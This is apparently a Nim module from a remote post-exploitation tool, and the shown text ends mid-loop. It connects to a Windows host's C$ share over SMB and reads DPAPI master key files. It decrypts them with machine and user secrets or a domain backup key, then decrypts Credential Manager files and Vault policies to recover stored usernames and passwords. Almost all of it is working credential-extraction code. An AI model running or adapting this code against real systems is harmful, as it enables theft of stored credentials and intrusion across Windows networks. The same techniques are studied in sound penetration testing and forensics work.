import std/[asyncdispatch, strutils]
import std/sha1
import ../smb/client as smb
import transfer as smbtransfer

type
  EvpCipherCtx2 {.importc: "EVP_CIPHER_CTX", header: "<openssl/evp.h>", incompleteStruct.} = object
  EvpCipherCtx2Ptr = ptr EvpCipherCtx2
  EvpCipherPtr2 = pointer

type
  RsaObj {.importc: "RSA", header: "<openssl/rsa.h>".} = object
  RsaPtr = ptr RsaObj
  BnObj  {.importc: "BIGNUM", header: "<openssl/bn.h>".} = object
  BnPtr  = ptr BnObj

proc RSA_new2(): RsaPtr {.cdecl, importc: "RSA_new", header: "<openssl/rsa.h>".}
proc RSA_free2(rsa: RsaPtr) {.cdecl, importc: "RSA_free", header: "<openssl/rsa.h>".}
proc RSA_private_decrypt2(flen: cint; fr, to: pointer; rsa: RsaPtr; padding: cint): cint
  {.cdecl, importc: "RSA_private_decrypt", header: "<openssl/rsa.h>".}
proc RSA_set0_key2(r: RsaPtr; n, e, d: BnPtr): cint
  {.cdecl, importc: "RSA_set0_key", header: "<openssl/rsa.h>".}
proc RSA_set0_factors2(r: RsaPtr; p, q: BnPtr): cint
  {.cdecl, importc: "RSA_set0_factors", header: "<openssl/rsa.h>".}
proc RSA_set0_crt_params2(r: RsaPtr; dmp1, dmq1, iqmp: BnPtr): cint
  {.cdecl, importc: "RSA_set0_crt_params", header: "<openssl/rsa.h>".}
proc BN_new2(): BnPtr {.cdecl, importc: "BN_new", header: "<openssl/bn.h>".}
proc BN_bin2bn2(s: pointer; len: cint; ret: BnPtr): BnPtr
  {.cdecl, importc: "BN_bin2bn", header: "<openssl/bn.h>".}
proc BN_free2(bn: BnPtr) {.cdecl, importc: "BN_free", header: "<openssl/bn.h>".}

proc EVP_CIPHER_CTX_new2(): EvpCipherCtx2Ptr {.cdecl, importc: "EVP_CIPHER_CTX_new", header: "<openssl/evp.h>".}
proc EVP_CIPHER_CTX_free2(ctx: EvpCipherCtx2Ptr) {.cdecl, importc: "EVP_CIPHER_CTX_free", header: "<openssl/evp.h>".}
proc EVP_CIPHER_CTX_set_padding2(ctx: EvpCipherCtx2Ptr; padding: cint): cint {.cdecl, importc: "EVP_CIPHER_CTX_set_padding", header: "<openssl/evp.h>".}
proc EVP_DecryptInit_ex2(ctx: EvpCipherCtx2Ptr; cipher: EvpCipherPtr2; impl, key, iv: pointer): cint {.cdecl, importc: "EVP_DecryptInit_ex", header: "<openssl/evp.h>".}
proc EVP_DecryptUpdate2(ctx: EvpCipherCtx2Ptr; outbuf: pointer; outl: ptr cint; inbuf: pointer; inl: cint): cint {.cdecl, importc: "EVP_DecryptUpdate", header: "<openssl/evp.h>".}
proc EVP_DecryptFinal_ex2(ctx: EvpCipherCtx2Ptr; outm: pointer; outl: ptr cint): cint {.cdecl, importc: "EVP_DecryptFinal_ex", header: "<openssl/evp.h>".}
proc EVP_aes_256_cbc2(): EvpCipherPtr2 {.cdecl, importc: "EVP_aes_256_cbc", header: "<openssl/evp.h>".}
proc EVP_aes_128_cbc2(): EvpCipherPtr2 {.cdecl, importc: "EVP_aes_128_cbc", header: "<openssl/evp.h>".}
proc EVP_des_ede3_cbc2(): EvpCipherPtr2 {.cdecl, importc: "EVP_des_ede3_cbc", header: "<openssl/evp.h>".}
proc EVP_sha1_2(): pointer {.cdecl, importc: "EVP_sha1", header: "<openssl/evp.h>".}
proc EVP_sha512_2(): pointer {.cdecl, importc: "EVP_sha512", header: "<openssl/evp.h>".}
proc HMAC2(evpMd: pointer; key: pointer; keyLen: cint; data: pointer; dataLen: csize_t;
           md: pointer; mdLen: ptr cuint): pointer {.cdecl, importc: "HMAC", header: "<openssl/hmac.h>".}

{.passL: "-lcrypto".}

const CALG_SHA1   = 0x8004'u32
const CALG_SHA512 = 0x800e'u32

type
  DpapiMasterKey* = object
    guid*: string
    keyType*: string
    key*: string

proc readU32Le2(data: string; offset: int): uint32 =
  if offset + 3 >= data.len: return 0
  uint32(ord(data[offset])) or
    (uint32(ord(data[offset+1])) shl 8) or
    (uint32(ord(data[offset+2])) shl 16) or
    (uint32(ord(data[offset+3])) shl 24)

proc readU64Le2(data: string; offset: int): uint64 =
  if offset + 7 >= data.len: return 0
  var r: uint64 = 0
  for i in 0..7:
    r = r or (uint64(ord(data[offset+i])) shl (i*8))
  r

proc u32Be(v: uint32): string =
  result = newString(4)
  result[0] = char((v shr 24) and 0xff)
  result[1] = char((v shr 16) and 0xff)
  result[2] = char((v shr 8) and 0xff)
  result[3] = char(v and 0xff)

proc hmacDigest(hashAlgo: uint32; key, data: string): string =
  let (evpMd, digestLen) =
    if hashAlgo == CALG_SHA512: (EVP_sha512_2(), 64)
    else:                        (EVP_sha1_2(),   20)
  result = newString(digestLen)
  var outLen: cuint = cuint(digestLen)
  discard HMAC2(evpMd,
    if key.len > 0: cast[pointer](unsafeAddr key[0]) else: nil, cint(key.len),
    if data.len > 0: cast[pointer](unsafeAddr data[0]) else: nil, csize_t(data.len),
    cast[pointer](addr result[0]), addr outLen)
  result.setLen(int(outLen))

proc hmacSha1(key, data: string): string = hmacDigest(CALG_SHA1, key, data)

proc xorBytes(a, b: string): string =
  let n = min(a.len, b.len)
  result = newString(n)
  for i in 0 ..< n:
    result[i] = char(ord(a[i]) xor ord(b[i]))

proc evpDecrypt(cipher: EvpCipherPtr2; key, iv, data: string): string =
  if data.len == 0: return ""
  let ctx = EVP_CIPHER_CTX_new2()
  if ctx == nil: return ""
  defer: EVP_CIPHER_CTX_free2(ctx)
  if EVP_DecryptInit_ex2(ctx, cipher, nil,
      cast[pointer](unsafeAddr key[0]),
      if iv.len > 0: cast[pointer](unsafeAddr iv[0]) else: nil) != 1:
    return ""
  discard EVP_CIPHER_CTX_set_padding2(ctx, 0)
  result = newString(data.len + 32)
  var outLen: cint = 0
  if EVP_DecryptUpdate2(ctx, cast[pointer](addr result[0]), addr outLen,
      cast[pointer](unsafeAddr data[0]), cint(data.len)) != 1:
    return ""
  var totalLen = int(outLen)
  var finalLen: cint = 0
  discard EVP_DecryptFinal_ex2(ctx, cast[pointer](addr result[totalLen]), addr finalLen)
  result.setLen(totalLen + int(finalLen))

proc deriveMasterKey(premaster, salt: string; iterations, hashAlgo, cryptAlgo: uint32): tuple[cryptKey, iv: string] =
  let cryptKeyLen = if cryptAlgo == 0x6610'u32: 32 else: 24
  let ivLen = if cryptAlgo == 0x6610'u32: 16 else: 8
  let needed = cryptKeyLen + ivLen
  var keyMaterial = ""
  var i: uint32 = 1
  while keyMaterial.len < needed:
    var derivedKey = hmacDigest(hashAlgo, premaster, salt & u32Be(i))
    for _ in 1 ..< int(max(1'u32, iterations)):
      derivedKey = xorBytes(derivedKey, hmacDigest(hashAlgo, premaster, derivedKey))
    keyMaterial.add derivedKey
    inc i
  (keyMaterial[0 ..< cryptKeyLen], keyMaterial[cryptKeyLen ..< cryptKeyLen + ivLen])

proc decryptMasterKeyBlob*(blob, premaster: string): string =
  if blob.len < 36 or premaster.len == 0: return ""
  let salt = blob[4 ..< 20]
  let iterations = readU32Le2(blob, 20)
  let hashAlgo  = readU32Le2(blob, 24)
  let cryptAlgo = readU32Le2(blob, 28)
  let encData = blob[32 .. ^1]
  let (cryptKey, iv) = deriveMasterKey(premaster, salt, iterations, hashAlgo, cryptAlgo)
  let cleartext =
    if cryptAlgo == 0x6610'u32:
      evpDecrypt(EVP_aes_256_cbc2(), cryptKey, iv, encData)
    elif cryptAlgo == 0x6603'u32:
      evpDecrypt(EVP_des_ede3_cbc2(), cryptKey, iv, encData)
    else:
      return ""
  let digestLen = if hashAlgo == CALG_SHA512: 64 else: 20
  if cleartext.len < 16 + digestLen + 64: return ""
  let hmacSalt  = cleartext[0 ..< 16]
  let hmacCheck = cleartext[16 ..< 16 + digestLen]
  let masterKey = cleartext[cleartext.len - 64 .. ^1]
  let hmacKey   = hmacDigest(hashAlgo, premaster, hmacSalt)
  let computed  = hmacDigest(hashAlgo, hmacKey, masterKey)
  if computed != hmacCheck: return ""
  masterKey

proc parseMasterKeyFile*(data: string): tuple[guid, masterBlob, backupBlob, domainBlob: string] =
  if data.len < 128: return ("", "", "", "")
  var guid = ""
  var i = 12
  while i + 1 < 84 and i + 1 < data.len:
    let lo = ord(data[i])
    let hi = ord(data[i+1])
    let cp = (hi shl 8) or lo
    if cp == 0: break
    guid.add char(cp)
    i += 2
  let masterKeyLen = int(readU64Le2(data, 96))
  let backupKeyLen = int(readU64Le2(data, 104))
  let credHistLen  = int(readU64Le2(data, 112))
  let domainKeyLen = int(readU64Le2(data, 120))
  var offset = 128
  var masterBlob, backupBlob, domainBlob = ""
  if masterKeyLen > 0 and offset + masterKeyLen <= data.len:
    masterBlob = data[offset ..< offset + masterKeyLen]
  offset += masterKeyLen
  if backupKeyLen > 0 and offset + backupKeyLen <= data.len:
    backupBlob = data[offset ..< offset + backupKeyLen]
  offset += backupKeyLen
  offset += credHistLen
  if domainKeyLen > 0 and offset + domainKeyLen <= data.len:
    domainBlob = data[offset ..< offset + domainKeyLen]
  (guid, masterBlob, backupBlob, domainBlob)

proc parseDomainKeyBlob(blob: string): tuple[secretData: string] =
  if blob.len < 28: return ("",)
  let secretLen = int(readU32Le2(blob, 4))
  if 28 + secretLen > blob.len: return ("",)
  (blob[28 ..< 28 + secretLen],)

proc rsaDecryptPrivateKeyBlob(privateKeyBlob, ciphertext: string): string =
  if privateKeyBlob.len < 20: return ""
  let bitLen = int(readU32Le2(privateKeyBlob, 12))
  let n      = bitLen div 8
  let h      = bitLen div 16
  if privateKeyBlob.len < 20 + n + 5*h + n: return ""
  var off = 20
  proc leBytes(s: string; start, sz: int): string =
    result = newString(sz)
    for k in 0 ..< sz: result[k] = s[start + sz - 1 - k]
  let modBytes  = leBytes(privateKeyBlob, off, n); off += n
  let p1Bytes   = leBytes(privateKeyBlob, off, h); off += h
  let p2Bytes   = leBytes(privateKeyBlob, off, h); off += h
  let e1Bytes   = leBytes(privateKeyBlob, off, h); off += h
  let e2Bytes   = leBytes(privateKeyBlob, off, h); off += h
  let coBytes   = leBytes(privateKeyBlob, off, h); off += h
  let dBytes    = leBytes(privateKeyBlob, off, n)
  let pubExpLE  = readU32Le2(privateKeyBlob, 16)
  var pubExpBe  = newString(4)
  pubExpBe[0] = char((pubExpLE shr 24) and 0xff)
  pubExpBe[1] = char((pubExpLE shr 16) and 0xff)
  pubExpBe[2] = char((pubExpLE shr 8)  and 0xff)
  pubExpBe[3] = char(pubExpLE          and 0xff)
  let rsa = RSA_new2()
  if rsa == nil: return ""
  defer: RSA_free2(rsa)
  let bnN  = BN_bin2bn2(cast[pointer](unsafeAddr modBytes[0]), cint(modBytes.len), nil)
  let bnE  = BN_bin2bn2(cast[pointer](unsafeAddr pubExpBe[0]), 4.cint, nil)
  let bnD  = BN_bin2bn2(cast[pointer](unsafeAddr dBytes[0]),   cint(dBytes.len),  nil)
  let bnP  = BN_bin2bn2(cast[pointer](unsafeAddr p1Bytes[0]),  cint(p1Bytes.len), nil)
  let bnQ  = BN_bin2bn2(cast[pointer](unsafeAddr p2Bytes[0]),  cint(p2Bytes.len), nil)
  let bnE1 = BN_bin2bn2(cast[pointer](unsafeAddr e1Bytes[0]),  cint(e1Bytes.len), nil)
  let bnE2 = BN_bin2bn2(cast[pointer](unsafeAddr e2Bytes[0]),  cint(e2Bytes.len), nil)
  let bnCo = BN_bin2bn2(cast[pointer](unsafeAddr coBytes[0]),  cint(coBytes.len), nil)
  if RSA_set0_key2(rsa, bnN, bnE, bnD) != 1: return ""
  if RSA_set0_factors2(rsa, bnP, bnQ) != 1: return ""
  if RSA_set0_crt_params2(rsa, bnE1, bnE2, bnCo) != 1: return ""
  var reversed = ciphertext
  for k in 0 ..< reversed.len div 2:
    swap(reversed[k], reversed[reversed.len - 1 - k])
  result = newString(n)
  let outLen = RSA_private_decrypt2(cint(reversed.len),
    cast[pointer](unsafeAddr reversed[0]),
    cast[pointer](addr result[0]), rsa, 1)
  if outLen <= 0: return ""
  result.setLen(outLen)

proc decryptMasterKeyWithDomainBackupKey*(domainKeyBlob, privateKeyBlob: string): string =
  let (secretData,) = parseDomainKeyBlob(domainKeyBlob)
  if secretData.len == 0 or privateKeyBlob.len < 20: return ""
  let decrypted = rsaDecryptPrivateKeyBlob(privateKeyBlob, secretData)
  if decrypted.len < 8: return ""
  let cbMasterKey = int(readU32Le2(decrypted, 0))
  if 8 + cbMasterKey > decrypted.len: return ""
  decrypted[8 ..< 8 + cbMasterKey]

proc fetchAndDecryptMasterKeys*(session: smb.SmbSession;
                                machineKeyHex, userKeyHex: string;
                                oldMachineKeyHex = "", oldUserKeyHex = "";
                                domainBackupKeyBlob = ""): Future[seq[DpapiMasterKey]] {.async.} =
  proc hexToBytes(h: string): string =
    var s = h
    if s.startsWith("0x") or s.startsWith("0X"): s = s[2..^1]
    var i = 0
    while i + 1 < s.len:
      result.add char(parseHexInt(s[i .. i+1]))
      i += 2

  let machineKey    = hexToBytes(machineKeyHex)
  let userKey       = hexToBytes(userKeyHex)
  let oldMachineKey = hexToBytes(oldMachineKeyHex)
  let oldUserKey    = hexToBytes(oldUserKeyHex)

  let treeId = await session.connectShareTree("C$")
  if treeId == 0:
    raise newException(IOError, "C$ tree connect failed")

  let sysProtectBase = "Windows\\System32\\Microsoft\\Protect"
  let sidTopListing = await smb.listShareDirectory(session, "C$", sysProtectBase)
  if sidTopListing.status != 0 and sidTopListing.entries.len == 0:
    raise newException(IOError, "machine protect dir failed 0x" & sidTopListing.status.toHex(8))
  if sidTopListing.entries.len == 0:
    raise newException(IOError, "machine protect dir empty")

  proc decryptMK(blob, domainBlob: string): string =
    result = decryptMasterKeyBlob(blob, machineKey)
    if result.len != 64 and oldMachineKey.len > 0:
      result = decryptMasterKeyBlob(blob, oldMachineKey)
    if result.len != 64:
      result = decryptMasterKeyBlob(blob, userKey)
    if result.len != 64 and oldUserKey.len > 0:
      result = decryptMasterKeyBlob(blob, oldUserKey)
    if result.len != 64 and domainBackupKeyBlob.len > 0 and domainBlob.len > 0:
      result = decryptMasterKeyWithDomainBackupKey(domainBlob, domainBackupKeyBlob)

  proc addMK(guid, keyHex, keyType: string) =
    result.add DpapiMasterKey(guid: guid, keyType: keyType, key: keyHex)

  proc tryDir(dirPath, keyType: string; strict: bool) {.async.} =
    let listing = await smb.listShareDirectory(session, "C$", dirPath)
    if listing.entries.len == 0:
      if strict: raise newException(IOError, keyType & " dir empty: " & dirPath)
      return
    for entry in listing.entries:
      if entry.isDirectory: continue
      if entry.name.len != 36: continue
      let filePath = dirPath & "\\" & entry.name
      let data = await smbtransfer.readFileIntoMemory(session, treeId, filePath)
      if data.len < 128:
        if strict: raise newException(IOError, keyType & " file too short: " & filePath)
        continue
      let (guid, masterBlob, backupBlob, domainBlob) = parseMasterKeyFile(data)
      if guid.len == 0:
        if strict: raise newException(IOError, keyType & " GUID parse failed: " & filePath)
        continue
      let blob = if masterBlob.len > 0: masterBlob else: backupBlob
      if blob.len == 0:
        if strict: raise newException(IOError, keyType & " no master key blob: " & filePath)
        continue
      let decrypted = decryptMK(blob, domainBlob)
      if decrypted.len != 64:
        if strict: raise newException(IOError, keyType & " HMAC verify failed for " & guid &
          " (cryptAlgo=0x" & readU32Le2(blob, 28).toHex(8) &
          " hashAlgo=0x" & readU32Le2(blob, 24).toHex(8) &
          " iter=" & $readU32Le2(blob, 20) & ")")
        continue
      var hexKey = ""
      for b in decrypted:
        const digits = "0123456789abcdef"
        hexKey.add digits[(ord(b) shr 4) and 0xf]
        hexKey.add digits[ord(b) and 0xf]
      addMK(guid, hexKey, keyType)

  var foundSys = false
  for sidEntry in sidTopListing.entries:
    if not sidEntry.isDirectory: continue
    if not sidEntry.name.startsWith("S-"): continue
    foundSys = true
    let sidPath = sysProtectBase & "\\" & sidEntry.name
    let keyType = if sidEntry.name == "S-1-5-18": "machine" else: sidEntry.name
    await tryDir(sidPath, keyType, true)
    let userSubListing = await smb.listShareDirectory(session, "C$", sidPath)
    for sub in userSubListing.entries:
      if not sub.isDirectory: continue
      let subKeyType =
        if sidEntry.name == "S-1-5-18" and sub.name == "User": "user"
        else: keyType & "-" & sub.name
      await tryDir(sidPath & "\\" & sub.name, subKeyType, false)
  if not foundSys:
    raise newException(IOError, "no S-1-5-* directories in " & sysProtectBase)

  let extraBasePaths = [
    ("Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Protect", "sysprofile"),
    ("Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Protect", "sysprofile-local"),
    ("Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Protect", "localsvc"),
    ("Windows\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Protect", "netsvc"),
  ]
  for (basePath, typeLabel) in extraBasePaths:
    let sidListing = await smb.listShareDirectory(session, "C$", basePath)
    for sidDir in sidListing.entries:
      if not sidDir.isDirectory: continue
      let protectPath = basePath & "\\" & sidDir.name
      let mkListing = await smb.listShareDirectory(session, "C$", protectPath)
      for entry in mkListing.entries:
        if entry.isDirectory: continue
        if entry.name.len != 36: continue
        let filePath = protectPath & "\\" & entry.name
        let data = await smbtransfer.readFileIntoMemory(session, treeId, filePath)
        if data.len < 128: continue
        let (guid, masterBlob, backupBlob, domainBlob) = parseMasterKeyFile(data)
        if guid.len == 0: continue
        let blob = if masterBlob.len > 0: masterBlob else: backupBlob
        if blob.len == 0: continue
        var decrypted = ""
        for (pre, oldPre) in [(machineKey, oldMachineKey), (userKey, oldUserKey)]:
          if pre.len == 0: continue
          decrypted = decryptMasterKeyBlob(blob, pre)
          if decrypted.len != 64 and oldPre.len > 0:
            decrypted = decryptMasterKeyBlob(blob, oldPre)
          if decrypted.len == 64: break
        if decrypted.len != 64 and domainBackupKeyBlob.len > 0 and domainBlob.len > 0:
          decrypted = decryptMasterKeyWithDomainBackupKey(domainBlob, domainBackupKeyBlob)
        if decrypted.len != 64: continue
        var hexKey = ""
        for b in decrypted:
          const digits = "0123456789abcdef"
          hexKey.add digits[(ord(b) shr 4) and 0xf]
          hexKey.add digits[ord(b) and 0xf]
        result.add DpapiMasterKey(guid: guid, keyType: typeLabel, key: hexKey)

proc EVP_Digest2(data: pointer; count: csize_t; md: pointer; size: ptr cuint;
                 mdType: pointer; impl: pointer): cint
  {.cdecl, importc: "EVP_Digest", header: "<openssl/evp.h>".}

proc shaDigest(hashAlgo: uint32; data: string): string =
  let (evpMd, dLen) =
    if hashAlgo == CALG_SHA512: (EVP_sha512_2(), 64)
    else: (EVP_sha1_2(), 20)
  result = newString(dLen)
  var outLen: cuint = cuint(dLen)
  discard EVP_Digest2(
    if data.len > 0: cast[pointer](unsafeAddr data[0]) else: nil,
    csize_t(data.len), cast[pointer](addr result[0]), addr outLen, evpMd, nil)
  result.setLen(int(outLen))

proc u32Le2(v: uint32): string =
  result = newString(4)
  result[0] = char(v and 0xff)
  result[1] = char((v shr 8) and 0xff)
  result[2] = char((v shr 16) and 0xff)
  result[3] = char((v shr 24) and 0xff)

proc guidBytesToStr*(g: string): string =
  if g.len < 16: return ""
  const d = "0123456789abcdef"
  proc h2(c: char): string =
    result = newString(2)
    result[0] = d[(ord(c) shr 4) and 0xf]
    result[1] = d[ord(c) and 0xf]
  result = h2(g[3]) & h2(g[2]) & h2(g[1]) & h2(g[0]) & "-" &
           h2(g[5]) & h2(g[4]) & "-" &
           h2(g[7]) & h2(g[6]) & "-" &
           h2(g[8]) & h2(g[9]) & "-"
  for i in 10..15:
    result.add h2(g[i])

type
  DpapiBlobResult* = object
    plaintext*: string
    guid*: string
    description*: string
    error*: string

proc hexDecode(h: string): string =
  var s = h
  if s.startsWith("0x") or s.startsWith("0X"): s = s[2..^1]
  var i = 0
  while i + 1 < s.len:
    result.add char(parseHexInt(s[i .. i+1]))
    i += 2

proc decryptDpapiBlob*(blob: string; masterKeys: seq[DpapiMasterKey]; entropy = ""): DpapiBlobResult =
  if blob.len < 48: return DpapiBlobResult(error: "blob too short")

  let masterKeyGuid = guidBytesToStr(blob[24 ..< 40])

  var offset = 44
  if offset + 4 > blob.len: return DpapiBlobResult(error: "truncated at descLen")
  let descLen = int(readU32Le2(blob, offset))
  offset += 4

  var description = ""
  if descLen > 0 and offset + descLen <= blob.len:
    var i = offset
    while i + 1 < offset + descLen:
      let cp = uint32(ord(blob[i])) or (uint32(ord(blob[i+1])) shl 8)
      i += 2
      if cp == 0: break
      if cp < 0x80: description.add char(cp)
      elif cp < 0x800:
        description.add char(0xC0 or (cp shr 6))
        description.add char(0x80 or (cp and 0x3F))
      else:
        description.add char(0xE0 or (cp shr 12))
        description.add char(0x80 or ((cp shr 6) and 0x3F))
        description.add char(0x80 or (cp and 0x3F))
  offset += descLen

  if offset + 12 > blob.len: return DpapiBlobResult(error: "truncated at cipherAlgo")
  let cipherAlgo    = readU32Le2(blob, offset)
  let cipherKeyBits = readU32Le2(blob, offset + 4)
  let saltLen       = int(readU32Le2(blob, offset + 8))
  offset += 12

  if offset + saltLen > blob.len: return DpapiBlobResult(error: "truncated at salt")
  let salt = blob[offset ..< offset + saltLen]
  offset += saltLen

  if offset + 4 > blob.len: return DpapiBlobResult(error: "truncated at hmacKeyLen")
  let hmacKeyLen = int(readU32Le2(blob, offset))
  offset += 4
  let hmacKey = if hmacKeyLen > 0 and offset + hmacKeyLen <= blob.len: blob[offset ..< offset + hmacKeyLen] else: ""
  offset += hmacKeyLen

  if offset + 12 > blob.len: return DpapiBlobResult(error: "truncated at hashAlgo")
  let hashAlgo    = readU32Le2(blob, offset)
  let hmac2KeyLen = int(readU32Le2(blob, offset + 8))
  offset += 12

  let hmac2Key = if hmac2KeyLen > 0 and offset + hmac2KeyLen <= blob.len: blob[offset ..< offset + hmac2KeyLen] else: ""
  offset += hmac2KeyLen
  let headerEnd = offset

  if offset + 4 > blob.len: return DpapiBlobResult(error: "truncated at dataLen")
  let dataLen = int(readU32Le2(blob, offset))
  offset += 4
  if offset + dataLen > blob.len: return DpapiBlobResult(error: "truncated at data")
  let encData = blob[offset ..< offset + dataLen]
  offset += dataLen

  let signStart = offset
  if offset + 4 > blob.len: return DpapiBlobResult(error: "truncated at signLen")
  let signLen = int(readU32Le2(blob, offset))
  offset += 4
  let sign = if signLen > 0 and offset + signLen <= blob.len: blob[offset ..< offset + signLen] else: ""

  var masterKeyHex = ""
  for mk in masterKeys:
    if mk.guid.toLowerAscii() == masterKeyGuid.toLowerAscii():
      masterKeyHex = mk.key
      break
  if masterKeyHex.len == 0:
    return DpapiBlobResult(guid: masterKeyGuid, description: description,
      error: "no master key for GUID " & masterKeyGuid)

  let masterKeyRaw = hexDecode(masterKeyHex)
  let masterKey    = shaDigest(CALG_SHA1, masterKeyRaw)

  let cryptKeyLen = case cipherAlgo
    of 0x6610'u32: 32
    of 0x6603'u32: 24
    else: int(cipherKeyBits) div 8
  let ivLen = if cipherAlgo == 0x6610'u32: 16 else: 8

  var keyMaterial = hmacDigest(hashAlgo, masterKey, salt)
  var kctr: uint32 = 2
  while keyMaterial.len < cryptKeyLen + ivLen:
    keyMaterial.add hmacDigest(hashAlgo, masterKey, salt & u32Le2(kctr))
    inc kctr
  let cryptKey = keyMaterial[0 ..< cryptKeyLen]
  let iv       = keyMaterial[cryptKeyLen ..< cryptKeyLen + ivLen]

  let plaintext =
    if cipherAlgo == 0x6610'u32:
      evpDecrypt(EVP_aes_256_cbc2(), cryptKey, iv, encData)
    elif cipherAlgo == 0x6603'u32:
      evpDecrypt(EVP_des_ede3_cbc2(), cryptKey, iv, encData)
    else:
      return DpapiBlobResult(guid: masterKeyGuid, description: description,
        error: "unsupported cipher 0x" & cipherAlgo.toHex(8))

  discard sign

  DpapiBlobResult(plaintext: plaintext, guid: masterKeyGuid, description: description)

type
  DpapiCredential* = object
    file*: string
    filePath*: string
    masterKeyGuid*: string
    target*: string
    targetAlias*: string
    description*: string
    username*: string
    credBlob*: string
    credBlobHex*: string
    credType*: uint32
    error*: string

proc credFromUtf16Le(s: string): string =
  var i = 0
  while i + 1 < s.len:
    let cp = uint32(ord(s[i])) or (uint32(ord(s[i+1])) shl 8)
    i += 2
    if cp == 0: break
    if cp < 0x80: result.add char(cp)
    elif cp < 0x800:
      result.add char(0xC0 or (cp shr 6))
      result.add char(0x80 or (cp and 0x3F))
    else:
      result.add char(0xE0 or (cp shr 12))
      result.add char(0x80 or ((cp shr 6) and 0x3F))
      result.add char(0x80 or (cp and 0x3F))

proc parseDecryptedCredential(data: string): DpapiCredential =
  if data.len < 52: return DpapiCredential(error: "too short: " & $data.len)
  var off = 0
  off += 4
  off += 4
  off += 4
  let credType = readU32Le2(data, off); off += 4
  off += 4
  off += 8
  off += 4
  off += 4
  off += 4
  off += 8

  proc nextField(d: string; o: var int): string =
    if o + 4 > d.len: return ""
    let sz = int(readU32Le2(d, o)); o += 4
    if sz <= 0 or o + sz > d.len: return ""
    result = d[o ..< o + sz]; o += sz

  result.target      = credFromUtf16Le(nextField(data, off))
  result.targetAlias = credFromUtf16Le(nextField(data, off))
  result.description = credFromUtf16Le(nextField(data, off))
  let rawBlob        = nextField(data, off)
  result.username    = credFromUtf16Le(nextField(data, off))
  let rawBlob2       = nextField(data, off)
  result.credType    = credType

  if rawBlob2.len > 0:
    result.credBlob = credFromUtf16Le(rawBlob2)
    if result.credBlob.len == 0:
      var h = ""
      for b in rawBlob2:
        const d = "0123456789abcdef"
        h.add d[(ord(b) shr 4) and 0xf]
        h.add d[ord(b) and 0xf]
      result.credBlobHex = h
    return

  if rawBlob.len > 0:
    if rawBlob.len mod 2 == 0:
      var allPrint = true
      var i = 0
      while i + 1 < rawBlob.len:
        let cp = uint32(ord(rawBlob[i])) or (uint32(ord(rawBlob[i+1])) shl 8)
        i += 2
        if cp == 0: break
        if cp < 0x20 or cp > 0x7e: allPrint = false; break
      if allPrint:
        result.credBlob = credFromUtf16Le(rawBlob)
        return
    var h = ""
    for b in rawBlob:
      const d = "0123456789abcdef"
      h.add d[(ord(b) shr 4) and 0xf]
      h.add d[ord(b) and 0xf]
    result.credBlobHex = h

proc parseDecryptedCredentialPublic*(data: string): DpapiCredential =
  parseDecryptedCredential(data)

proc fetchAndDecryptCredentials*(session: smb.SmbSession;
                                  masterKeys: seq[DpapiMasterKey]): Future[seq[DpapiCredential]] {.async.} =
  let treeId = await session.connectShareTree("C$")
  if treeId == 0: return

  const credPaths = [
    "Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials",
    "Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials",
    "Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Credentials",
    "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Credentials",
    "Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Credentials",
    "Windows\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Credentials",
  ]

  for dirPath in credPaths:
    let listing = await smb.listShareDirectory(session, "C$", dirPath)
    if listing.entries.len == 0: continue
    for entry in listing.entries:
      if entry.isDirectory: continue
      let filePath = dirPath & "\\" & entry.name
      let fileData = await smbtransfer.readFileIntoMemory(session, treeId, filePath)
      if fileData.len < 16: continue
      let blobStart = if fileData.len > 12: 12 else: 0
      let blobData = fileData[blobStart .. ^1]
      let dec = decryptDpapiBlob(blobData, masterKeys)
      var cred =
        if dec.error.len == 0: parseDecryptedCredential(dec.plaintext)
        else: DpapiCredential(error: dec.error)
      cred.file = entry.name
      cred.filePath = dirPath & "\\" & entry.name
      cred.masterKeyGuid = dec.guid
      result.add cred

  const vaultPaths = [
    "Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault",
    "Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Vault",
  ]

  for vaultBase in vaultPaths:
    let vaultDirs = await smb.listShareDirectory(session, "C$", vaultBase)
    for vdir in vaultDirs.entries:
      if not vdir.isDirectory: continue
      let vaultDir = vaultBase & "\\" & vdir.name

      let vpolData = await smbtransfer.readFileIntoMemory(session, treeId, vaultDir & "\\Policy.vpol")
      if vpolData.len < 60: continue

      var off = 4
      off += 16
      let descLen = int(readU32Le2(vpolData, off)); off += 4
      off += descLen
      off += 12
      let vpolSize = int(readU32Le2(vpolData, off)); off += 4
      off += 16
      off += 16
      let keyBlobLen = int(readU32Le2(vpolData, off)); off += 4
      if off + keyBlobLen > vpolData.len: continue
      let vpolBlob = vpolData[off ..< off + keyBlobLen]

      let vpolDec = decryptDpapiBlob(vpolBlob, masterKeys)
      if vpolDec.error.len > 0 or vpolDec.plaintext.len < 24: continue

      let keys = vpolDec.plaintext
      var aesKey1 = ""
      var aesKey2 = ""
      var koff = 0
      if koff + 12 <= keys.len:
        let magic1 = readU32Le2(keys, koff)
        if magic1 == 0x4d42444b'u32:
          let klen1 = int(readU32Le2(keys, koff + 8))
          if koff + 12 + klen1 <= keys.len:
            aesKey1 = keys[koff + 12 ..< koff + 12 + klen1]
            koff += 12 + klen1
      if koff + 12 <= keys.len:
        let magic2 = readU32Le2(keys, koff)
        if magic2 == 0x4d42444b'u32:
          let klen2 = int(readU32Le2(keys, koff + 8))
          if koff + 12 + klen2 <= keys.len:
            aesKey2 = keys[koff + 12 ..< koff + 12 + klen2]

      if aesKey1.len == 0 and aesKey2.len == 0: continue
      let vaultKey = if aesKey1.len >= 16: aesKey1 else: aesKey2

      let vcrdListing = await smb.listShareDirectory(session, "C$", vaultDir)
      for vcrdEntry in vcrdListing.entries:
        if vcrdEntry.isDirectory: continue
        let ext = vcrdEntry.name.toLowerAscii()
        if not ext.endsWith(".vcrd"): continue

